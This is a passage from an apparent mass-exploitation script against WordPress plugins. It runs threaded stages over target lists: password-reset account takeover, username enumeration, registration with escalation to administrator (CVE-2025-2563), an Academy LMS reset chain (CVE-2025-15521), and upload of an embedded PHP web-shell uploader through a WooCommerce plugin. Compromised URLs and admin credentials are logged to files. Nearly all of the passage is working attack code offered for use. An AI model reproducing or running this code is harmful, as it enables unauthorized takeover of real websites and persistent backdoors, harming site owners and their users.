        full = (wp_base + path).replace("//", "/")
        return base_host + full

    def _check_admin_access(sess, root_url):
        admin_paths = ["/wp-admin/index.php", "/wp-admin/profile.php", "/wp-admin/edit.php", "/wp-admin/plugins.php", "/wp-admin/users.php"]
        markers = ['id="adminmenu"', 'id="wpadminbar"', '<div id="wpwrap">', 'class="wp-admin', 'id="wpcontent"', 'id="wpbody-content"', "users.php", "plugins.php", "edit.php"]
        deny = ["sorry, you are not allowed to access this page", "you do not have sufficient permissions", "insufficient permissions"]
        ok_pages = 0
        for ep in admin_paths:
            u = root_url.rstrip("/") + ep
            try:
                r = sess.get(u, timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            if r.status_code != 200:
                continue
            if "wp-login.php" in (r.url or ""):
                return False
            content = r.text or ""
            low = content.lower()
            if any(d in low for d in deny):
                return False
            if sum(1 for mk in markers if mk in content) >= 3:
                ok_pages += 1
            if ok_pages >= 2:
                return True
        try:
            r2 = sess.get(root_url.rstrip("/") + "/wp-admin/plugin-install.php", timeout=timeout, allow_redirects=True)
            if r2.status_code == 200:
                low2 = (r2.text or "").lower()
                if any(d in low2 for d in deny):
                    return False
                if "upload-plugin" in low2 or "plugin-install-tab" in low2:
                    return True
        except Exception:
            pass
        return ok_pages >= 1

    def _strict_login_attempt(sess, base_host, wp_base, login_path, username, password):
        root_site = _build_wp_url(base_host, wp_base, "/")
        login_url = _build_wp_url(base_host, wp_base, login_path)
        try:
            sess.get(login_url, timeout=timeout, allow_redirects=True)
        except Exception:
            pass
        data = {"log": username.strip(), "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        try:
            r = sess.post(login_url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        content = (r.text or "").lower()
        fails = ["incorrect username or password", "invalid username", "invalid password", "error: the username",
                 "is not registered", "authentication failed", "login failed", "unknown username"]
        if any(x in content for x in fails):
            return False
        if not any(c.name.startswith("wordpress_logged_in") for c in sess.cookies):
            return False
        return _check_admin_access(sess, root_site)

    def _find_wp_login_path(sess, base_host, wp_base):
        for p in ["/wp-login.php", "/wordpress/wp-login.php", "/wp/wp-login.php", "/blog/wp-login.php", "/cms/wp-login.php"]:
            try:
                r = sess.get(_build_wp_url(base_host, wp_base, p), timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            txt = r.text or ""
            if r.status_code == 200 and "<form" in txt and "password" in txt.lower():
                return p
        return "/wp-login.php"

    _AP = re.compile(r"/author/([^/]+)")
    _ABP = [
        re.compile(r'author-\w+">([a-z0-9_\-]+)<', re.I),
        re.compile(r"/author/([a-z0-9_\-]+)/", re.I),
        re.compile(r'"slug":"([a-z0-9_\-]+)"', re.I),
        re.compile(r'"username":"([a-z0-9_\-]+)"', re.I),
    ]

    def _collect_candidates(base_host, wp_base):
        sess = build_session(timeout)
        root = _build_wp_url(base_host, wp_base, "/")
        users: Set[str] = set()
        for i in range(1, 11):
            try:
                u = f"{root}/?author={i}"
                r = sess.get(u, timeout=timeout, allow_redirects=False)
                if r.status_code in (301, 302):
                    loc = r.headers.get("location", "") or r.headers.get("Location", "")
                    m = _AP.search(loc)
                    if m:
                        users.add(m.group(1))
                r2 = sess.get(u, timeout=timeout, allow_redirects=True)
                if r2.status_code == 200 and r2.text:
                    for patt in _ABP:
                        for x in patt.findall(r2.text):
                            users.add(x)
            except Exception:
                continue
        try:
            api = root.rstrip("/") + "/wp-json/wp/v2/users"
            r3 = sess.get(api, timeout=timeout)
            if r3.status_code == 200:
                data = r3.json()
                if isinstance(data, list):
                    for entry in data:
                        if isinstance(entry, dict):
                            for key in ("slug", "username", "name"):
                                v = entry.get(key)
                                if v:
                                    users.add(str(v))
        except Exception:
            pass
        parsed = urlparse(root)
        host = parsed.netloc.split(":")[0].lower()
        if host.startswith("www."):
            host = host[4:]
        first_label = host.split(".")[0]
        if first_label and len(first_label) > 2:
            users.add(first_label)
        users.add("admin")
        users = {u for u in users if u and 2 < len(u) < 50}
        return sorted(users) if users else ["admin"]

    def _trigger_wp_reset_flow_core(sess, base_host, wp_base, username, new_password):
        root = _build_wp_url(base_host, wp_base, "/")
        lost_url = root.rstrip("/") + "/wp-login.php?action=lostpassword"
        malicious_key = "hackedresetkey"
        try:
            r1 = sess.post(lost_url, data={"user_login": username, "user_pass": malicious_key, "wp-submit": "Get New Password"},
                           timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        if r1.status_code not in (200, 302):
            return False
        rp_url = root.rstrip("/") + f"/wp-login.php?action=rp&key={malicious_key}&login={username}"
        try:
            r2 = sess.get(rp_url, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        if r2.status_code not in (200, 302):
            return False
        reset_url = root.rstrip("/") + "/wp-login.php?action=resetpass"
        try:
            r3 = sess.post(reset_url, data={"pass1": new_password, "pass2": new_password, "pw_weak": "on",
                                             "rp_key": malicious_key, "wp-submit": "Save Password"},
                           timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        return r3.status_code == 200

    def exploit_target(target: str) -> bool:
        try:
            base_host, wp_base = _split_wp_base(target)
            label = f"{base_host}{wp_base or ''}"
            new_pass = resolve_credential("password", "Nxploited_adminSA")
            sess = build_session(timeout)
            ok_flow = _trigger_wp_reset_flow_core(sess, base_host, wp_base, "admin", new_pass)
            if not ok_flow:
                return False
            users = _collect_candidates(base_host, wp_base)
            sess0 = build_session(timeout)
            login_path = _find_wp_login_path(sess0, base_host, wp_base)
            any_hit = False
            for username in users:
                s2 = build_session(timeout)
                if _strict_login_attempt(s2, base_host, wp_base, login_path, username, new_pass):
                    ts = time.strftime("%Y-%m-%dT%H:%M:%S")
                    stage_write(stage_name, "wp_login_reset_success.txt",
                                f"[{ts}] {label} | {label}/wp-login.php | account={username}  pass={new_pass}")
                    safe_write_result("vulnurls.txt", label)
                    safe_write_result("login.txt", f"{label} | {username} | {new_pass} | {username}@nx.com | {label}/wp-login.php")
                    any_hit = True
            return any_hit
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 14: ACADEMY LMS (CVE-2025-15521)
# ============================================================================

def run_academy_lms(targets: List[str], threads: int, timeout: int) -> Dict:
    """Academy LMS full chain: extract academy_nonce -> reset password -> enumerate users -> login verify."""
    stage_name = "Academy-LMS"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting Academy LMS full chain ({len(targets)} targets)")

    RESET_PATH = "/academy-retrieve-password/"
    COURSE_PATH = "/course/"
    MAX_COURSE_PAGES = 15
    RESET_USER_ID = 1

    def split_wp_base(url):
        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urlparse(url)
        base_host = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"
        if path == "/":
            return base_host, ""
        return base_host, path.rstrip("/")

    def build_wp_url(base_host, wp_base, path):
        if not path.startswith("/"):
            path = "/" + path
        full = (wp_base + path).replace("//", "/")
        return base_host + full

    def extract_reset_key(body):
        if not body: return None
        for pat in [
            r'"academy_nonce"\s*:\s*"([^"]+)"',
            r"'academy_nonce'\s*:\s*'([^']+)'",
            r'academy_nonce["\']?\s*:\s*["\']([^"\']+)["\']',
            r'AcademyGlobal\.academy_nonce\s*=\s*["\']([^"\']+)["\']',
            r'data-academy_nonce=["\']([^"\']+)["\']',
            r'academy_nonce\s*=\s*["\']([^"\']+)["\']',
        ]:
            m = re.search(pat, body)
            if m: return m.group(1)
        return None

    def find_course_links(body, base_host, wp_base, max_links):
        links = []
        if not body: return links
        for m in re.finditer(r'href=["\']([^"\']+)["\']', body, re.I):
            href = m.group(1)
            if "/course/" in href:
                url = href if href.startswith(("http://", "https://")) else build_wp_url(base_host, wp_base, href)
                if url not in links:
                    links.append(url)
                if len(links) >= max_links:
                    break
        return links

    def crawl_for_key(sess, base_host, wp_base):
        course_root = build_wp_url(base_host, wp_base, COURSE_PATH)
        try:
            r = sess.get(course_root, timeout=timeout, allow_redirects=True)
        except Exception:
            return None
        links = find_course_links(r.text or "", base_host, wp_base, MAX_COURSE_PAGES)
        for url in links:
            try:
                r2 = sess.get(url, timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            key = extract_reset_key(r2.text or "")
            if key:
                return key
        home_url = build_wp_url(base_host, wp_base, "/")
        try:
            r3 = sess.get(home_url, timeout=timeout, allow_redirects=True)
        except Exception:
            return None
        return extract_reset_key(r3.text or "")

    def trigger_reset(sess, base_host, wp_base, key, new_password, user_id):
        reset_url = build_wp_url(base_host, wp_base, RESET_PATH)
        full = f"{reset_url}&user_id={user_id}" if "?" in reset_url else f"{reset_url}?user_id={user_id}"
        data = {"new_password": new_password, "confirm_new_password": new_password, "security": key, "academy_reset_submit": "1"}
        try:
            r = sess.post(full, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        return "Security check failed" not in (r.text or "")

    AUTHOR_PATTERN = re.compile(r"/author/([^/]+)")
    AUTHOR_BODY_PATTERNS = [
        re.compile(r'author-\w+">([a-z0-9_\-]+)<', re.I),
        re.compile(r"/author/([a-z0-9_\-]+)/", re.I),
        re.compile(r'"slug":"([a-z0-9_\-]+)"', re.I),
        re.compile(r'"username":"([a-z0-9_\-]+)"', re.I),
    ]

    def check_admin_access(sess, root_url):
        admin_paths = ["/wp-admin/index.php", "/wp-admin/profile.php", "/wp-admin/edit.php", "/wp-admin/plugins.php", "/wp-admin/users.php"]
        markers = ['id="adminmenu"', 'id="wpadminbar"', '<div id="wpwrap">', 'class="wp-admin', 'id="wpcontent"', 'id="wpbody-content"', "users.php", "plugins.php", "edit.php"]
        deny = ["sorry, you are not allowed to access this page", "you do not have sufficient permissions", "insufficient permissions"]
        ok_pages = 0
        for ep in admin_paths:
            u = root_url.rstrip("/") + ep
            try:
                r = sess.get(u, timeout=timeout, allow_redirects=True)
            except Exception:
                continue
            if r.status_code != 200: continue
            if "wp-login.php" in (r.url or ""): return False
            content = r.text or ""
            low = content.lower()
            if any(d in low for d in deny): return False
            found = sum(1 for m in markers if m in content)
            if found >= 3: ok_pages += 1
            if ok_pages >= 2: return True
        try:
            r2 = sess.get(root_url.rstrip("/") + "/wp-admin/plugin-install.php", timeout=timeout, allow_redirects=True)
            if r2.status_code == 200:
                low2 = (r2.text or "").lower()
                if any(d in low2 for d in deny): return False
                if "upload-plugin" in low2 or "plugin-install-tab" in low2: return True
        except Exception:
            pass
        return ok_pages >= 1

    def strict_login_attempt(sess, base_host, wp_base, username, password):
        root_site = build_wp_url(base_host, wp_base, "/")
        login_url = build_wp_url(base_host, wp_base, "/wp-login.php")
        try:
            sess.get(login_url, timeout=timeout, allow_redirects=True)
        except Exception:
            pass
        data = {"log": username.strip(), "pwd": password, "wp-submit": "Log In", "testcookie": "1"}
        try:
            r = sess.post(login_url, data=data, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        content = (r.text or "").lower()
        fails = ["incorrect username or password", "invalid username", "invalid password", "error: the username", "is not registered", "authentication failed", "login failed", "unknown username"]
        if any(x in content for x in fails): return False
        if not any(c.name.startswith("wordpress_logged_in") for c in sess.cookies): return False
        return check_admin_access(sess, root_site)

    def collect_candidates(base_host, wp_base):
        sess = build_session(timeout)
        root = build_wp_url(base_host, wp_base, "/")
        users = set()
        for i in range(1, 11):
            try:
                u = f"{root}/?author={i}"
                r = sess.get(u, timeout=timeout, allow_redirects=False)
                if r.status_code in (301, 302):
                    loc = r.headers.get("location", "") or r.headers.get("Location", "")
                    m = AUTHOR_PATTERN.search(loc)
                    if m: users.add(m.group(1))
                r2 = sess.get(u, timeout=timeout, allow_redirects=True)
                if r2.status_code == 200 and r2.text:
                    for patt in AUTHOR_BODY_PATTERNS:
                        for x in patt.findall(r2.text):
                            users.add(x)
            except Exception:
                continue
        try:
            api = root.rstrip("/") + "/wp-json/wp/v2/users"
            r3 = sess.get(api, timeout=timeout)
            if r3.status_code == 200:
                for entry in r3.json() if isinstance(r3.json(), list) else []:
                    if isinstance(entry, dict):
                        for key in ("slug", "username", "name"):
                            v = entry.get(key)
                            if v: users.add(str(v))
        except Exception:
            pass
        parsed = urlparse(root)
        host = parsed.netloc.split(":")[0].lower()
        if host.startswith("www."): host = host[4:]
        first_label = host.split(".")[0]
        if first_label and len(first_label) > 2: users.add(first_label)
        users.add("admin")
        users = {u for u in users if u and 2 < len(u) < 50}
        return sorted(users) if users else ["admin"]

    def exploit_target(target: str) -> bool:
        try:
            base_host, wp_base = split_wp_base(target)
            label = f"{base_host}{wp_base or ''}"
            sess = build_session(timeout)
            new_pass = resolve_credential("password", "adminSA")
            key = crawl_for_key(sess, base_host, wp_base)
            if not key: return False
            if not trigger_reset(sess, base_host, wp_base, key, new_pass, RESET_USER_ID): return False
            usernames = collect_candidates(base_host, wp_base)
            hits = 0
            for username in usernames:
                s2 = build_session(timeout)
                if strict_login_attempt(s2, base_host, wp_base, username, new_pass):
                    ts = time.strftime("%Y-%m-%dT%H:%M:%S")
                    stage_write(stage_name, "academy_access_success.txt",
                                f"[{ts}] {label} - account={username}  pass={new_pass}")
                    safe_write_result("vulnurls.txt", label)
                    hits += 1
            return hits > 0
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 15: USER REGISTRATION (CVE-2025-2563)
# ============================================================================

def run_user_registration(targets: List[str], threads: int, timeout: int) -> Dict:
    """User Registration membership full chain: find form -> register user -> escalate to admin."""
    stage_name = "User-Reg"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting User Registration full chain ({len(targets)} targets)")

    REG_PASS = resolve_credential("password", "Nx_adminSA")

    def extract_membership_js_nonce(html):
        rg = re.compile(r'(?:var|let|const|\s|;)ur_membership_frontend_localized_data\s*=\s*(\{.*?\})\s*;', re.DOTALL | re.IGNORECASE)
        m = rg.search(html)
        if not m:
            rg2 = re.compile(r'ur_membership_frontend_localized_data\s*=\s*(\{.*?\})', re.DOTALL | re.IGNORECASE)
            m = rg2.search(html)
            if not m: return None
        blob = m.group(1)
        try:
            cleaned = blob.strip().rstrip(";").replace(r'\/', '/')
            data = json.loads(cleaned)
            if isinstance(data, dict):
                n = data.get("_nonce")
                if isinstance(n, str) and len(n) >= 8: return n
        except Exception:
            pass
        m2 = re.search(r'"_nonce"\s*:\s*"([0-9a-zA-Z]{8,64})"', blob, re.IGNORECASE)
        return m2.group(1) if m2 else None

    def extract_form_candidates_from_html(html):
        security_candidates = []
        frontend_nonce_candidates = []
        form_id_candidates = []
        membership_id_candidates = []
        for m in re.finditer(r'membership_id=([0-9]{1,10})', html):
            if m.group(1) not in membership_id_candidates: membership_id_candidates.append(m.group(1))
        for m in re.finditer(r'name=["\']urm_membership["\'][^>]*value=["\']([0-9]{1,10})["\']', html, re.I):
            if m.group(1) not in membership_id_candidates: membership_id_candidates.append(m.group(1))
        for m in re.finditer(r'name=["\']form_id["\']\s+value=["\']([0-9]{1,10})["\']', html, re.I):
            if m.group(1) not in form_id_candidates: form_id_candidates.append(m.group(1))
        for m in re.finditer(r'name=["\']ur-user-form-id["\']\s+value=["\']([0-9]{1,10})["\']', html, re.I):
            if m.group(1) not in form_id_candidates: form_id_candidates.append(m.group(1))
        for m in re.finditer(r'(?:name|id)=["\']ur_frontend_form_nonce["\'][^>]*value=["\']([0-9a-zA-Z]{8,64})["\']', html, re.I):
            if m.group(1) not in frontend_nonce_candidates: frontend_nonce_candidates.append(m.group(1))
        for m in re.finditer(r'name=["\']security["\']\s+value=["\']([0-9a-zA-Z]{8,64})["\']', html, re.I):
            if m.group(1) not in security_candidates: security_candidates.append(m.group(1))
        m_sec = re.search(r'user_registration_params\s*=\s*\{[^}]*"user_registration_form_data_save"\s*:\s*"([0-9a-zA-Z]{8,64})"', html, re.DOTALL)
        if m_sec and m_sec.group(1) not in security_candidates: security_candidates.append(m_sec.group(1))
        json_blob_rg = re.compile(r'(\{[^{}]*(?:form_id|membership_id|security|ur_frontend_form_nonce|user_registration_form_data_save)[^{}]*\})', re.DOTALL | re.IGNORECASE)
        for m in json_blob_rg.finditer(html):
            blob = m.group(1).replace(r'\/', '/')
            try:
                data = json.loads(blob)
            except Exception:
                for ms in re.finditer(r'"security"\s*:\s*"([0-9a-zA-Z]{8,64})"', blob):
                    if ms.group(1) not in security_candidates: security_candidates.append(ms.group(1))
                for ms2 in re.finditer(r'"user_registration_form_data_save"\s*:\s*"([0-9a-zA-Z]{8,64})"', blob):
                    if ms2.group(1) not in security_candidates: security_candidates.append(ms2.group(1))
                for mf in re.finditer(r'"ur_frontend_form_nonce"\s*:\s*"([0-9a-zA-Z]{8,64})"', blob):
                    if mf.group(1) not in frontend_nonce_candidates: frontend_nonce_candidates.append(mf.group(1))
                for mid in re.finditer(r'"form_id"\s*:\s*"([0-9]{1,10})"', blob):
                    if mid.group(1) not in form_id_candidates: form_id_candidates.append(mid.group(1))
                for mid2 in re.finditer(r'"membership_id"\s*:\s*"([0-9]{1,10})"', blob):
                    if mid2.group(1) not in membership_id_candidates: membership_id_candidates.append(mid2.group(1))
                continue
            if not isinstance(data, dict): continue
            for k, arr in [("security", security_candidates), ("user_registration_form_data_save", security_candidates),
                           ("ur_frontend_form_nonce", frontend_nonce_candidates)]:
                if k in data and isinstance(data[k], str) and data[k] not in arr: arr.append(data[k])
            for k, arr in [("form_id", form_id_candidates), ("membership_id", membership_id_candidates)]:
                if k in data and isinstance(data[k], (str, int)) and str(data[k]) not in arr: arr.append(str(data[k]))
        return {"security_candidates": security_candidates, "frontend_nonce_candidates": frontend_nonce_candidates,
                "form_id_candidates": form_id_candidates, "membership_id_candidates": membership_id_candidates}

    def merge_candidate_lists(all_sets):
        merged = {"security_candidates": [], "frontend_nonce_candidates": [], "form_id_candidates": [], "membership_id_candidates": []}
        for s in all_sets:
            for key in merged:
                for val in s.get(key, []):
                    if val not in merged[key]: merged[key].append(val)
        for key in merged:
            if not merged[key]: merged[key].append(None)
        return merged

    def fetch_all_relevant_pages(session, base):
        htmls = {}
        root = base.rstrip("/")
        for ep in ["/membership-pricing/", "/membership-registration/", "/registration/"]:
            try:
                r = session.get(f"{root}{ep}", timeout=timeout, verify=False)
                if r.status_code == 200: htmls[ep] = r.text
            except Exception:
                continue
        if any("membership-pricing" in k for k in htmls):
            pricing_html = next(v for k, v in htmls.items() if "membership-pricing" in k)
            m_link = re.search(r'href=["\'](https?://[^"\']*membership-registration/\?membership_id=[0-9]{1,10})["\']', pricing_html, re.I)
            m_mid = re.search(r'membership-registration/\?membership_id=([0-9]{1,10})', pricing_html)
            reg_url2 = m_link.group(1) if m_link else (f"{root}/membership-registration/?membership_id={m_mid.group(1)}" if m_mid else None)
            if reg_url2:
                try:
                    rr2 = session.get(reg_url2, timeout=timeout, verify=False)
                    if rr2.status_code == 200: htmls[reg_url2] = rr2.text
                except Exception:
                    pass
        return htmls

    def try_registration_combo(session, base, username, email, password, security, frontend_nonce, form_id, membership_id):
        ajax_url = base.rstrip("/") + "/wp-admin/admin-ajax.php"
        membership_id = membership_id or "1"
        form_id = form_id or "1"
        form_data_list = [
            {"field_name": "user_login", "value": username, "field_type": "text", "label": "Username"},
            {"field_name": "user_email", "value": email, "field_type": "email", "label": "User Email"},
            {"field_name": "user_pass", "value": password, "field_type": "password", "label": "User Password"},
            {"field_name": "user_confirm_password", "value": password, "field_type": "password", "label": "Confirm Password"},
            {"value": membership_id, "field_type": "radio", "label": "membership", "field_name": f"membership_field_{random.randint(1000000,9999999)}"},
        ]
        form_data_json = json.dumps(form_data_list, separators=(",", ":"))
        data = {
            "action": "user_registration_user_form_submit",
            "security": security or "",
            "form_data": form_data_json,
            "form_id": form_id,
            "registration_language": "en-US",
            "ur_frontend_form_nonce": frontend_nonce or "",
            "is_membership_active": membership_id,
            "membership_type": membership_id,
        }
        headers = {"User-Agent": get_random_ua(), "X-Requested-With": "XMLHttpRequest",
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "Referer": base.rstrip("/") + "/membership-registration/"}
        try:
            r = session.post(ajax_url, data=data, headers=headers, timeout=timeout, verify=False)
            return r.json().get("success") is True if r.status_code == 200 else False
        except Exception:
            return False

    def verify_admin_login(base, username, password):
        session = requests.Session()
        session.verify = False
        login_url = base.rstrip("/") + "/wp-login.php"
        try:
            session.get(login_url, timeout=timeout)
        except Exception:
            pass
        headers = {"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded", "Referer": login_url, "Cookie": "wordpress_test_cookie=WP Cookie check"}
        try:
            r = session.post(login_url, data={"log": username.strip(), "pwd": password, "wp-submit": "Log In", "testcookie": "1"},
                             headers=headers, timeout=timeout, allow_redirects=True)
        except Exception:
            return False
        logged_cookie = "wordpress_logged_in" in r.headers.get("Set-Cookie", "") or any(c.name.startswith("wordpress_logged_in") for c in session.cookies)
        admin_indicators = ["wp-admin-bar", "adminmenu", "manage_options", "users.php", "plugins.php", "plugin-install.php", "plugin-install-tab", "upload-plugin"]
        for au in [base.rstrip("/") + p for p in ["/wp-admin/", "/wp-admin/index.php", "/wp-admin/users.php", "/wp-admin/plugin-install.php"]]:
            try:
                ra = session.get(au, timeout=timeout, allow_redirects=False)
                if ra.status_code in (301, 302) and "wp-login.php" in ra.headers.get("Location", ""): continue
                if ra.status_code == 200 and any(ind.lower() in ra.text.lower() for ind in admin_indicators):
                    return True
            except Exception:
                continue
        return False

    def exploit_role_admin(session, base, username, membership_js_nonce, membership_id):
        if not membership_js_nonce: return False
        ajax_url = base.rstrip("/") + "/wp-admin/admin-ajax.php"
        membership_id = membership_id or "1"
        today = datetime.utcnow().strftime("%Y-%m-%d")
        members_data_dict = {"membership": membership_id, "total": "0", "payment_method": "free", "start_date": today, "username": username, "role": "administrator"}
        members_data = json.dumps(members_data_dict, separators=(",", ":"))
        form_response = json.dumps({"username": username, "registration_type": "membership"}, separators=(",", ":"))
        data = {"action": "user_registration_membership_register_member", "_wpnonce": membership_js_nonce, "members_data": members_data, "form_response": form_response}
        headers = {"User-Agent": get_random_ua(), "X-Requested-With": "XMLHttpRequest",
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "Referer": base.rstrip("/") + "/membership-pricing/"}
        try:
            r = session.post(ajax_url, data=data, headers=headers, timeout=timeout, verify=False)
            j = r.json()
        except Exception:
            return False
        if j.get("success") is True:
            d = j.get("data") or {}
            msg = str(d.get("message", "")).lower()
            if "new member has been successfully created" in msg:
                return True
        return False

    def write_reg_result(base, username, email, password):
        ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        stage_write(stage_name, "reg.txt", f"[{ts}] {base}/wp-login.php user:{username} email:{email} pass:{password}")

    def write_admin_result(base, username, password):
        ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        stage_write(stage_name, "Nx_admin.txt", f"[{ts}] {base}/wp-login.php user:{username} pass:{password}")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base: return False
            session = build_session(timeout)
            ss = build_session(timeout)
            htmls = fetch_all_relevant_pages(session, base)
            if not htmls: return False
            membership_js_nonce = None
            for _, h in htmls.items():
                membership_js_nonce = extract_membership_js_nonce(h)
                if membership_js_nonce: break
            all_sets = [extract_form_candidates_from_html(h) for _, h in htmls.items()]
            merged = merge_candidate_lists(all_sets)
            security_candidates = merged["security_candidates"]
            frontend_candidates = merged["frontend_nonce_candidates"]
            form_id_candidates = merged["form_id_candidates"]
            membership_id_candidates = merged["membership_id_candidates"]
            suffix = random.randint(100, 999)
            prefix = resolve_credential("username_prefix", "Nxploited")
            username = f"{prefix}_{suffix}"
            email = resolve_credential("email", "sp0k4club@gmail.com")
            password = REG_PASS
            registration_success = False
            used_mid = None
            max_attempts = 20
            attempt_idx = 0
            for sec in security_candidates:
                for fn in frontend_candidates:
                    for fid in form_id_candidates:
                        for mid in membership_id_candidates:
                            attempt_idx += 1
                            if attempt_idx > max_attempts: return False
                            ok = try_registration_combo(session, base, username, email, password, sec, fn, fid, mid)
                            if ok:
                                registration_success = True
                                used_mid = mid or "1"
                                write_reg_result(base, username, email, password)
                                break
                        if registration_success: break
                    if registration_success: break
                if registration_success: break
            if not registration_success: return False
            if membership_js_nonce:
                if exploit_role_admin(ss, base, username, membership_js_nonce, used_mid):
                    write_admin_result(base, username, REG_PASS)
                    is_admin = verify_admin_login(base, username, REG_PASS)
                    if is_admin:
                        safe_write_result("login.txt", f"{base} | {username} | {REG_PASS} | {email} | {base}/wp-login.php")
                    safe_write_result("vulnurls.txt", base)
                    return True
            safe_write_result("vulnurls.txt", base)
            return True
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 16: WK WOOCOMMERCE UPLOAD
# ============================================================================

def run_wk_woocommerce(targets: List[str], threads: int, timeout: int) -> Dict:
    """WK WooCommerce file upload via wkwcpa_handle_prescription_session AJAX."""
    stage_name = "WK-WooCom"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    result_file = "wk_woocommerce_results.txt"
    log_info(stage_name, f"Starting WK WooCommerce stage ({len(targets)} targets, {threads} threads)")

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            session = build_session(timeout)
            nonce = None
            ajax_url = None

            for page in ["/", "/shop/", "/product/"]:
                try:
                    r = session.get(f"{base}{page}", timeout=timeout, verify=False)
                    if r.status_code != 200:
                        continue
                    m = re.search(r'wkwcpaFrontObj\s*=\s*(\{.*?\});', r.text, re.DOTALL)
                    if m:
                        try:
                            obj = json.loads(m.group(1))
                            aj = obj.get("ajax", {})
                            ajax_url = aj.get("ajaxUrl")
                            nonce = aj.get("ajaxNonce")
                        except Exception:
                            pass
                    if not nonce:
                        um = re.search(r'"ajaxUrl"\s*:\s*"([^"]+)"', r.text)
                        nm = re.search(r'"ajaxNonce"\s*:\s*"([^"]+)"', r.text)
                        if um and nm:
                            ajax_url = um.group(1)
                            nonce = nm.group(1)
                    if nonce:
                        break
                except Exception:
                    continue
            if not nonce:
                return False

            target_ajax = ajax_url or f"{base}/wp-admin/admin-ajax.php"
            shell_content = b'<?php echo \'<title> NezukaBot Here! </title><b><pre>{ Priv8 Uploader By NezukaBot }</b>\'.\'<br><br>\'.\'<b>System Info:</b> \'.php_uname().\'<br>\'.\'<b>Current Directory:</b> \'.getcwd();echo \'<br><form method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="20"><input name="_upl" type="submit" id="_upl" value="upload"></form></td></tr></table></pre>\';if($_FILES){if(!empty($_FILES[\'file\'])){move_uploaded_file($_FILES[\'file\'][\'tmp_name\'],$_FILES[\'file\'][\'name\']);echo "<b>File Uploaded !!!</b><br>name : ".$_FILES[\'file\'][\'name\']."<br>size : ".$_FILES[\'file\'][\'size\']."<br>type : ".$_FILES[\'file\'][\'type\'];}else{echo "<b>Upload Failed !!!</b><br><br>";}}?>\n'
            sh_path = os.path.join(DATA_DIR, "shell.php")
            if os.path.isfile(sh_path):
                try:
                    with open(sh_path, "rb") as sf:
                        shell_content = sf.read()
                except Exception:
                    pass
            files = {"wkwc_pa_prescription_attachment[]": ("shell.php", shell_content, "application/x-php")}
            data = {"action": "wkwcpa_handle_prescription_session", "nonce": nonce, "type": "upload"}
            try:
                ur = session.post(target_ajax, data=data, files=files, timeout=timeout, verify=False)
                jr = ur.json()
                atts = (jr.get("data") or {}).get("attachments_img_html") or []
                html_att = " ".join(str(x) for x in atts)
                sm = re.search(r'src=["\']([^"\']+)["\']', html_att)
                if sm:
                    shell_url = sm.group(1)
                    try:
                        vr = session.get(shell_url, timeout=timeout, verify=False)
                        if vr.status_code == 200 and "NezukaBot Here" in vr.text:
                            stage_write(stage_name, "wk_woocommerce_results.txt", f"{shell_url}")
                            safe_write_result("vulnurls.txt", base)
                            return True
                    except Exception:
                        pass
                    stage_write(stage_name, "wk_woocommerce_results.txt", f"{shell_url}")
                    safe_write_result("vulnurls.txt", base)
                    return True
            except Exception:
                pass
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result():
                    results["success"] += 1
                else:
                    results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 17: MASTERIYO ELEGANT
# ============================================================================

def run_masteriyo_elegant(targets: List[str], threads: int, timeout: int) -> Dict:
    """Masteriyo Elegant - CVE-2025-39459: extract ct_register_nonce -> POST admin-ajax with admin role registration."""
    stage_name = "Masteriyo-Elegant"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting Masteriyo Elegant full chain ({len(targets)} targets)")

    DEBUG_DIR = os.path.join(DATA_DIR, "debug_responses")
    os.makedirs(DEBUG_DIR, exist_ok=True)
    USERNAME_PREFIX = resolve_credential("username_prefix", "Nxploited")
